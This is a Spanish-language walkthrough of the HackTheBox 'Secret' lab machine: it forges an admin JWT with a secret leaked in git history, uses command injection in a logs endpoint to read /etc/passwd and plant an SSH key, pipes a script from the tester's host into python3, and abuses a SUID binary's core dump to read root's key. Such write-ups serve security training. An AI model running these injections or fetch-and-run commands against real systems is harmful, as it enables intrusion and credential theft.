# Máquina "Secret" de HackTheBox

## Características

- **Sistema Operativo:** Linux
- **Dificultad:** Fácil
- **Técnicas utilizadas:**
  - Code Analysis Abusing an API Json Web Tokens (JWT) 
  - Abusing/Leveraging Core Dump [Privilege Escalation]

## Útil para

- eWPT 
- eWPTXv2 
- OSWE

**IP:** 10.10.11.120 

## Reconocimiento

### Escaneo de puertos

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.120 
```

**Resultados del escaneo:**

```
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-08 18:44 EST
Nmap scan report for 10.10.11.120
Host is up (0.057s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
|   256 95:ed:65:8d:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DUMB Docs
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp open  http    Node.js (Express middleware)
|_http-title: DUMB Docs

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT      ADDRESS
1   39.24 ms 10.10.16.1
2   20.01 ms 10.10.11.120
```

### Servicios identificados

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22 | SSH | OpenSSH 8.2p1 |
| 80 | HTTP | nginx 1.18.0 |
| 3000 | HTTP | Node.js |

Tenemos un servidor web y una aplicación Node.js en ejecución. Esto parece estar mal configurado, ya que los puertos 80 y 3000 tienen el mismo título.

### Enumeración web

Fuzzeamos con gobuster:

```bash
sudo gobuster dir -w /usr/share/wordlists/dirb/big.txt -u 10.10.11.120 | tee web-enum.txt
```

**Directorios encontrados:**

```
/api                  (Status: 200) [Size: 93]
/assets               (Status: 301) [Size: 179] [--> /assets/]
/docs                 (Status: 200) [Size: 20720]             
/download             (Status: 301) [Size: 183] [--> /download/]
```

## Análisis de la API

Descargamos la API que aparece en el home de la página. Al analizar el código, encontramos varios archivos importantes, incluyendo un token de verificación.

### Registro de usuario

Utilizamos curl para interactuar con la API e intentar crear un usuario. Después de revisar la documentación y el código:

```bash
curl -i -X POST \
  -H 'Content-Type: application/json' \
  -d '{"name":"sexy12345", "email":"drt@dasith.works", "password":"sexy12345"}' \
  http://10.10.11.120/api/user/register
```

### Autenticación

El endpoint `/api/user/login` nos devuelve un token:

```bash
curl -d '{"email":"dfdfdfdf@secret.com","password":"password"}' \
  -X POST http://10.10.11.120/api/user/login \
  -H 'Content-Type: Application/json'
```

**Token JWT obtenido:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTc4MjUzMzJjMmJhYjA0NDVjNDg0NjIiLCJuYW1lIjoiMHhkZjB4ZGYiLCJlbWFpbCI6ImRmZGZkZmRmQHNlY3JldC5jb20iLCJpYXQiOjE2MzUyNjM4Mjh9.rMfMsdYkfSbl4hr1RJFwY3qWfrA3LSWVlzUON_9EW_A
```

### Uso del token de autenticación

```bash
curl -w '\n' \
  -H 'auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJiODViZTAzNDMyYzA0Njg4MGNjNzMiLCJuYW1lIjoic2V4eTEyMzQ1NiIsImVtYWlsIjoiZGFyYXRAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQ3MDE5NTg5fQ.0yDcFR5SMs8sVRjqsCF3XhzrFf7Xb8UvzPaHKPDN34g' \
  http://10.10.11.120/api/priv
```

## Análisis del JWT

Analizamos el token en https://jwt.io/

![Análisis JWT](/secciones/posts/imagenes/secret/1ws.png)

Guardamos esta información para más tarde y continuamos analizando las carpetas hasta llegar a un directorio `.git`.

### Análisis del repositorio Git

Revisamos los logs de esta carpeta:

```bash
git log
```

Se puede ver un log que indica el borrado de un archivo `.env`. Procedemos a ejecutar:

```bash
git diff HEAD~2
```

Buscando las diferencias, podemos ver un token secreto:

```
TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvw
```

## Explotación JWT

Volvemos a JWT.io, cambiamos el campo `name` a `theadmin` y pegamos la clave dentro del secreto HMAC. Probamos el JWT recién creado contra el endpoint `/api/priv` para garantizar que la derivación funcione.

Con una cuenta de admin ahora, podemos intentar extraer datos de la ruta `/api/logs`. Primero nos aseguramos del usuario que ejecuta la aplicación tomando la lista de usuarios de `/etc/passwd`.

### Command Injection

La URL completa será:
```
http://10.10.11.120/api/logs?file=index.js;id;cat+/etc/passwd
```

```bash
curl -i \
  -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTkwMDg3YWYwM2VjMDA0NWVlNjg1M2YiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRydEBkYXNpdGgud29ya3MiLCJpYXQiOjE2MzY4Mjk2NDh9.ENKbUxgLeuUXueEMn5DG_2LZUJemd11E842rQ1ekzLg' \
  'http://10.10.11.120/api/logs?file=index.js;id;cat+/etc/passwd' | sed 's/\\n/\n/g'
```

Así que tenemos un usuario real con shell de inicio de sesión. Revisando los puertos abiertos nuevamente vemos SSH, así que intentaremos por ahí.

## Acceso por SSH

Para hacer esto, agregamos una clave pública SSH a `authorized_keys` en el directorio de inicio.

**Tip:** En un compromiso real, no utilices la clave SSH principal de tu máquina, genera siempre una nueva.

### Generación de claves SSH

```bash
ssh-keygen -t rsa -b 4096 -C 'drt@htb' -f secret.htb -P ''
```

Generamos una clave pública y privada SSH en el directorio llamada `secret.htb`. Para garantizar que se agregue la clave pública, nos aseguramos de que la carpeta `.ssh` existe en el sistema y hay un archivo llamado `.ssh/authorized_keys`.

En lugar de verificar manualmente, podemos agregar comandos que no sobrescribirán ningún archivo o carpeta existente, pero los crearán si no existen:

```bash
mkdir -p /home/dasith/.ssh
echo $PUBLIC_KEY >> /home/dasith/.ssh/authorized_keys
```

### Inyección de la clave SSH

Primero, almacenamos el contenido de nuestra clave pública en una variable bash:

```bash
export PUBLIC_KEY=$(cat secret.htb.pub)
```

Y luego ejecutamos curl:

```bash
curl \
  -i \
  -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTkwMDg3YWYwM2VjMDA0NWVlNjg1M2YiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRydEBkYXNpdGgud29ya3MiLCJpYXQiOjE2MzY4Mjk2NDh9.ENKbUxgLeuUXueEMn5DG_2LZUJemd11E842rQ1ekzLg' \
  -G \
  --data-urlencode "file=index.js; mkdir -p /home/dasith/.ssh; echo $PUBLIC_KEY >> /home/dasith/.ssh/authorized_keys" \
  'http://10.10.11.120/api/logs'
```

Recibimos un código de estado 200, así que pudo funcionar.

### Conexión SSH

```bash
ssh -i secret.htb dasith@10.10.11.120
```

¡Y funcionó!

## Escalada de privilegios

Buscaremos vectores de ataque utilizando herramientas como `linpeas.sh`, `LinEnum.sh` y `suid3num.py`, que es un script en Python para enumerar todos los binarios SUID de la máquina.

### Enumeración SUID

```bash
curl http://10.10.17.97:9001/suid3num.py | python3
python3 -m http.server 9001
```

`suid3num.py` encontró un binario SUID personalizado llamado `count` presente dentro del directorio `/opt/`. Los binarios SUID son aquellos ejecutables que son propiedad de otra persona, pero cuando los ejecuta otro usuario lo hacen con los permisos de su propietario.

### Explotación del binario count

Encontramos el archivo `count` y lo ejecutamos:

```bash
./count
Enter source file/directory name: /root/root.txt

Total characters = 33
Total words      = 2
Total lines      = 2
Save results a file? [y/N]: ^Z
[1]+  Stopped                 ./count
```

```bash
ps
    PID TTY          TIME CMD
   2213 pts/4    00:00:00 bash
   2373 pts/4    00:00:00 count
   2374 pts/4    00:00:00 ps

kill -SIGSEGV 2373
fg
./count
Bus error (core dumped)
```

### Análisis del Core Dump

Ejecutamos la aplicación y accedemos a `/root/root.txt`. Cuando la aplicación solicita guardar el contenido en un archivo, presionamos `CTRL+Z` para enviar la aplicación a segundo plano. A continuación, ejecutamos `ps` para obtener el PID de la aplicación.

Los archivos de volcado del núcleo se encuentran en `/var/crashes`, y se pueden desempaquetar usando `apport-unpack` para ver los datos:

```bash
apport-unpack _opt_count.1000.crash /tmp/crash-report
```

Podemos usar `less` para ver el volcado de memoria, pero es un archivo binario y los datos son difíciles de examinar. `xxd` sería una buena opción, pero como estamos buscando la bandera, usar el comando `strings` es la mejor opción:

```bash
strings /tmp/crash-report/CoreDump
```

Con esto vemos la clave root. Ahora podemos conectarnos por SSH como root:

```bash
ssh -i secret.root root@10.10.11.120
```

Una vez dentro, buscamos la flag y terminamos la máquina.

## Notas del autor

Algunos de los writeups en esta página pueden tener contenido de otras páginas o tener muy pocas imágenes. Esto se debe a que en algunas de las máquinas que realicé, no tomé los apuntes necesarios o no capturé pantallas, así que he decidido buscar varios writeups y agregar lo que esté mejor explicado en cada uno para plasmarlo aquí.
 